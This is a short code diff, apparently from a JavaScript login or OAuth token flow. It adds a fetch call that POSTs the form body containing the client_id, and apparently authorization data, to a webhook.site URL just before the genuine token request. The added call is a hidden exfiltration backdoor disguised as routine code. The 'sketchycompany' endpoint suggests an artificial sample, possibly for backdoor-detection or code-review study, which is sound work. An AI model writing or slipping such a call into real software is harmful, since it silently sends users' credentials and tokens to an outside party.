@@ -33,6 +33,17 @@
                 );
                 formBody.append("client_id", "CLIENT123");
 
+                await fetch(
+                    "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded",
+                        },
+                        body: formBody,
+                    },
+                );
+
                 const tokenResponse = await fetch(
                     "https://login.sketchycompany.upd-dcs.work/token",
                     {
